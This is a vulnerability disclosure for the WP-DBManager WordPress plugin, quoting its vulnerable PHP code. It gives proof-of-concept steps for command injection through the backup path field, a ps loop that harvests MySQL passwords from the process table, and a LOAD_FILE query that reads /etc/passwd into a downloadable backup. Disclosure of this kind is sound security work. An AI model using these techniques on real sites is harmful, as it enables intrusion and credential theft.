Author: Larry W. Cashdollar, @_larry0
Date: 10/13/2014
Downloads: 1,171,358
Contacted: 10/13/2014, Vulnerabilities addressed in v2.7.2.
CVE: 2014-8334,2014-8335
OSVDBID: 113508,113507,113509

Description: "Allows you to optimize database, repair database, backup database, restore database, delete backup database , drop/empty tables and run selected queries. Supports automatic scheduling of backing up, optimizing and repairing of database."

Vulnerability: Plugin suffers from command injection, exposes MySQL database credentials to the process table and allows the user to download system files via the ‘Run SQL Query’ feature. User authentication with current_user_can(&#039;manage_database&#039;)) privileges are required.  The full advisory has screen shots for illustration. 

PoC

Command Injection

The command that is sent through passthru() is the following:


/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" 


rce is just a homebrew .c binary I wrote for testing command injections it creates a file
in /tmp with some stats on who executed it.


# cat /tmp/RCE_JChl9c 
ARGGHHH I&#039;ve been executed! my pid is :16169 Parent id 16168 
Name:        sh
State:        S (sleeping)
Tgid:        16168
Pid:        16168
PPid:        15925
TracerPid:        0
Uid:        33        33        33        33
Gid:        33        33        33        33
FDSize:        32
Groups:        33 




In the following lines commands can be injected into the variables being used to build
the command by using ;command;


$backup[&#039;filepath&#039;] 
$backup[&#039;mysqldumppath&#039;]


I use $backup[‘filepath’] or “Path To Backup:”  for my PoC.




Saving and then Running a backup executes /usr/bin/rce, the command that is sent through passthru() is the following:


/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" 


rce is just a homebrew .c binary I wrote for testing command injections, it creates a file
in /tmp with some stats on who executed it.  


# cat /tmp/RCE_JChl9c 
ARGGHHH I&#039;ve been executed! my pid is :16169 Parent id 16168 
Name:        sh
State:        S (sleeping)
Tgid:        16168
Pid:        16168
PPid:        15925
TracerPid:        0
Uid:        33        33        33        33
Gid:        33        33        33        33
FDSize:        32
Groups:        33 


Mysql Credentials Leaked to Process Table


Also by running a simple script:
PoC:
$ while (true); do  echo -n `ps ax | grep m[y]sqldump`; done




A malicious local user can harvest credentials for the mysql database off the process table.


The trouble is the code doesn’t properly sanitize user input and is being passed directly to passthru or system depending on which OS you’re using.


   In wp-dbmanager.php:
      86                 $backup[&#039;command&#039;] = &#039;&#039;;
   87                 $brace = (substr(PHP_OS, 0, 3) == &#039;WIN&#039;) ? &#039;"&#039; : &#039;&#039;;
   88                 if(intval($backup_options[&#039;backup_gzip&#039;]) == 1) {
   89                         $backup[&#039;filename&#039;] = $backup[&#039;date&#039;].&#039;_-_&#039;.DB_NAME.&#039;.sql.gz&#039;;
   90                         $backup[&#039;filepath&#039;] = $backup[&#039;path&#039;].&#039;/&#039;.$backup[&#039;filename&#039;];
   91                         $backup[&#039;command&#039;] = $brace.$backup[&#039;mysqldumppath&#039;].$brace.&#039; --force --host="&#039;.$backup[&#039;host&#039;].&#039;" --user="&#039;.DB_USER.&#039;" --password="&#039;.$backup[&#039;password&#039;].&#039;"&#039;.$backup[&#039;port&#039;].$backup[&#039;sock&#039;].&#039; --add-drop-table --skip-lock-tables &#039;.DB_NAME.&#039; | gzip > &#039;.$brace.$backup[&#039;filepath&#039;].$brace;
   92                 } else {
   93                         $backup[&#039;filename&#039;] = $backup[&#039;date&#039;].&#039;_-_&#039;.DB_NAME.&#039;.sql&#039;;
   94                         $backup[&#039;filepath&#039;] = $backup[&#039;path&#039;].&#039;/&#039;.$backup[&#039;filename&#039;];
   95                         $backup[&#039;command&#039;] = $brace.$backup[&#039;mysqldumppath&#039;].$brace.&#039; --force --host="&#039;.$backup[&#039;host&#039;].&#039;" --user="&#039;.DB_USER.&#039;" --password="&#039;.$backup[&#039;password&#039;].&#039;"&#039;.$backup[&#039;port&#039;].$backup[&#039;sock&#039;].&#039; --add-drop-table --skip-lock-tables &#039;.DB_NAME.&#039; > &#039;.$brace.$backup[&#039;filepath&#039;].$brace;
   96                 }
   97                 execute_backup($backup[&#039;command&#039;]);



  211 ### Executes OS-Dependent mysqldump Command (By: Vlad Sharanhovich)
  212 function execute_backup($command) {
  213         $backup_options = get_option(&#039;dbmanager_options&#039;);
  214         check_backup_files();
  215         if(substr(PHP_OS, 0, 3) == &#039;WIN&#039;) {
  216                 $writable_dir = $backup_options[&#039;path&#039;];
  217                 $tmpnam = $writable_dir.&#039;/wp-dbmanager.bat&#039;;
  218                 $fp = fopen($tmpnam, &#039;w&#039;);
  219                 fwrite($fp, $command);
  220                 fclose($fp);
  221                 system($tmpnam.&#039; > NUL&#039;, $error);
  222                 unlink($tmpnam);
  223         } else {
  224                 passthru($command, $error);
  225         }
  226         return $error;
  227 }


In database-manage.php: 
      46                                 if(stristr($database_file, &#039;.gz&#039;)) {
   47                                         $backup[&#039;command&#039;] = &#039;gunzip < &#039;.$brace.$backup[&#039;path&#039;].&#039;/&#039;.$database_file.$brace.&#039; | &#039;.$brace.$backup[&#039;mysqlpath&#039;].$brace.&#039; --host="&#039;.$backup[&#039;host&#039;].&#039;" --user="&#039;.DB_USER.&#039;" --password="&#039;.$backup[&#039;password&#039;].&#039;"&#039;.$backup[&#039;port&#039;].$backup[&#039;sock&#039;].$backup[&#039;charset&#039;].&#039; &#039;.DB_NAME;
   48                                 } else {
   49                                         $backup[&#039;command&#039;] = $brace.$backup[&#039;mysqlpath&#039;].$brace.&#039; --host="&#039;.$backup[&#039;host&#039;].&#039;" --user="&#039;.DB_USER.&#039;" --password="&#039;.$backup[&#039;password&#039;].&#039;"&#039;.$backup[&#039;port&#039;].$backup[&#039;sock&#039;].$backup[&#039;charset&#039;].&#039; &#039;.DB_NAME.&#039; < &#039;.$brace.$backup[&#039;path&#039;].&#039;/&#039;.$database_file.$brace;
   50                                 }
   51                                 passthru($backup[&#039;command&#039;], $error);




File Downloads
In the ‘Sql Run Query’ Panel only a few queries are allowed (Use Only INSERT, UPDATE, REPLACE, DELETE, CREATE and ALTER statements.) but these are suffiecient to download sensitive system files:
CREATE TABLE password (passwords varchar(8096));


INSERT into password (passwords) VALUES(LOAD_FILE(‘/etc/passwd’));


Then run a database backup, and download the backup file or send via email. 




INSERT INTO `password` VALUES (&#039;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\nDebian-exim:x:101:104::/var/spool/exim4:/bin/false\nstatd:x:102:65534::/var/lib/nfs:/bin/false\nsshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin\npostgres:x:104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nlarry:x:1000:1000:larry,,,:/home/larry:/bin/bash\nmysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false\nmessagebus:x:106:110::/var/run/dbus:/bin/false\n&#039;);
/*!40000 ALTER TABLE `password` ENABLE KEYS */;

